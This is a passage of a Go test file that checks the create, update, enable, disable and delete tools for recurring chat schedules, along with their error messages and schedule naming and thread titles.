	if out := tools.List(ctx, testUser); !strings.Contains(out, id) {
		t.Fatalf("list = %q", out)
	}
	// "Disable the cinema scout" is an update to enabled=false; "enable it"
	// turns it on again, also after loom disabled it for its time.
	if out := tools.Update(ctx, testUser, "", map[string]any{"id": id, "enabled": false}); !strings.Contains(out, "next run none, off.") {
		t.Fatalf("disable = %q", out)
	}
	if err := f.store.Disable(ctx, testUser.ID, id, schedule.DisabledTimeout, time.Now()); err != nil {
		t.Fatal(err)
	}
	if out := tools.List(ctx, testUser); !strings.Contains(out, "off, disabled automatically: two runs in a row") {
		t.Fatalf("list after a timeout = %q", out)
	}
	if out := tools.Update(ctx, testUser, "", map[string]any{"id": id, "enabled": true}); !strings.Contains(out, ", on.") {
		t.Fatalf("enable = %q", out)
	}
	if got, _ := f.store.GetSchedule(ctx, testUser.ID, id); !got.Enabled || got.DisabledReason != "" || got.NextRunAt == nil {
		t.Fatalf("schedule after enable = %+v", got)
	}
	if out := tools.Update(ctx, testUser, "", map[string]any{}); !strings.Contains(out, "id is required") {
		t.Fatalf("update without id = %q", out)
	}
	if out := tools.Update(ctx, testUser, "", map[string]any{"id": "nope", "name": "x"}); !strings.Contains(out, "No schedule has that id") {
		t.Fatalf("update unknown = %q", out)
	}
	f.sllm.template = "*/5 * * * *"
	if out := tools.Update(ctx, testUser, "", map[string]any{"id": id, "interval": "every 5 minutes"}); !strings.Contains(out, "at most twice a day") {
		t.Fatalf("too often = %q", out)
	}
	f.sllm.ok = false
	if out := tools.Create(ctx, testUser, "", map[string]any{"prompt": "p", "interval": "when it rains"}); !strings.Contains(out, "names no recurring time") {
		t.Fatalf("not understood = %q", out)
	}
	if out := tools.Create(ctx, testUser, "", map[string]any{"interval": "daily"}); !strings.Contains(out, "Could not save") {
		t.Fatalf("missing prompt = %q", out)
	}
	if out := tools.Delete(ctx, testUser, map[string]any{}); !strings.Contains(out, "id is required") {
		t.Fatalf("delete without id = %q", out)
	}
	if out := tools.Delete(ctx, testUser, map[string]any{"id": id}); !strings.Contains(out, `Deleted the schedule "Cinema scout"`) {
		t.Fatalf("delete = %q", out)
	}
	if out := tools.Delete(ctx, testUser, map[string]any{"id": id}); !strings.Contains(out, "No schedule has that id") {
		t.Fatalf("delete twice = %q", out)
	}
	if got := scheduleToolError(schedule.ErrLimitReached); !strings.Contains(got, "most allowed") {
		t.Fatalf("limit error = %q", got)
	}
	if got := scheduleToolError(errors.New("boom")); got != "tool failed: boom" {
		t.Fatalf("other error = %q", got)
	}
}

func TestScheduleNamerAndTitles(t *testing.T) {
	ctx := context.Background()
	f := newScheduleFixture(t)
	s := newServer(f.deps)
	if name, err := (scheduleNamer{s: s}).NameSchedule(ctx, testUser.ID, "find films"); err != nil || name != "Cinema scout" {
		t.Fatalf("name = %q, %v", name, err)
	}
	thread, _ := f.chat.CreateThread(ctx, testUser.ID, chat.CreateThreadInput{Title: "old"})
	if err := (scheduleThreadTitles{s: s}).SetThreadTitle(ctx, testUser.ID, thread.ID, "new"); err != nil {
		t.Fatal(err)
	}
	got, _, _ := f.chat.GetThread(ctx, testUser.ID, thread.ID)
	if got.Title != "new" {
		t.Fatalf("title = %q", got.Title)
	}
}
